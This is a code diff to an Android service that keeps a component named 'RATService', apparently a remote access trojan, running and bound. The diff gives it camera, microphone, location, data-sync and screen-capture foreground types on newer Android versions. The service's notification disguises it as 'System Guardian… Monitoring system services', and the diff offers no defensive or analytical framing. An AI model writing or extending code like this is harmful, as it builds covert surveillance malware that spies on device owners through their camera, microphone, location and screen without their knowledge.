@@ -9,6 +9,7 @@ import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
 import android.content.ServiceConnection;
+import android.content.pm.ServiceInfo;
 import android.os.Build;
 import android.os.IBinder;
 import android.os.RemoteException;
@@ -83,14 +84,54 @@ public class GuardianService extends Service {
         Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
             .setContentTitle("System Guardian")
             .setContentText("Monitoring system services")
-            .setSmallIcon(android.R.drawable.ic_menu_manage) // Use a proper icon
+            .setSmallIcon(android.R.drawable.ic_menu_manage)
             .setPriority(NotificationCompat.PRIORITY_LOW)
             .setCategory(Notification.CATEGORY_SERVICE)
             .build();
         
-        // Start as foreground service
-        startForeground(NOTIFICATION_ID, notification);
-        Log.d(TAG, "Started as foreground service with notification");
+        // Start as foreground service with appropriate service types for Android 10+
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+            // Combine all service types this service might need
+            int foregroundServiceTypes = 0;
+            
+            // Add camera type for video streaming support
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                foregroundServiceTypes |= ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA;
+            }
+            
+            // Add microphone type for audio recording
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                foregroundServiceTypes |= ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE;
+            }
+            
+            // Add location type for location tracking
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                foregroundServiceTypes |= ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION;
+            }
+            
+            // Add data sync type for file transfers
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                foregroundServiceTypes |= ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC;
+            }
+            
+            // For Android 14+ (API 34+), also add media projection if needed
+            if (Build.VERSION.SDK_INT >= 34) { // Android 14
+                foregroundServiceTypes |= ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION;
+            }
+            
+            try {
+                startForeground(NOTIFICATION_ID, notification, foregroundServiceTypes);
+                Log.d(TAG, "Started as foreground service with types: " + foregroundServiceTypes);
+            } catch (Exception e) {
+                // Fallback to standard startForeground if type combination fails
+                Log.e(TAG, "Error starting foreground with types, falling back", e);
+                startForeground(NOTIFICATION_ID, notification);
+            }
+        } else {
+            // Pre-Android 10: simple startForeground
+            startForeground(NOTIFICATION_ID, notification);
+            Log.d(TAG, "Started as foreground service (legacy)");
+        }
     }
     
     @Override
@@ -148,9 +189,14 @@ public class GuardianService extends Service {
         Log.d(TAG, "Restarting RATService");
         Intent intent = new Intent(this, RATService.class);
         
-        // Use startService instead of startForegroundService for RATService
-        // since it might not be a foreground service
-        startService(intent);
+        // Use startForegroundService for RATService on Android 8+ since it needs camera permissions
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            startForegroundService(intent);
+            Log.d(TAG, "Started RATService as foreground service");
+        } else {
+            startService(intent);
+            Log.d(TAG, "Started RATService as regular service");
+        }
         
         // Try to rebind
         bindToRATService();
